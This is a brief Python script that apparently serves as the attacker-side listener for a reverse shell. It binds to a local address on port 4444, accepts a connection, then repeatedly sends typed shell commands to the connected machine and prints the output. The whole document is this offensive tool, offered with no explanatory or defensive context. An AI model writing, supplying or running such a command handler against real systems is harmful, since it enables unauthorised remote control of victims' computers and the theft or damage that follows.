import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.0.102", 4444))
listener.listen(0)
print("[+] Waiting")
connection, address = listener.accept()
print("[+] Got A connection" + str(address))
while True:
	command = input(">> ")
	connection.send(command)
	result = connection.recv(1024)
	print(result)
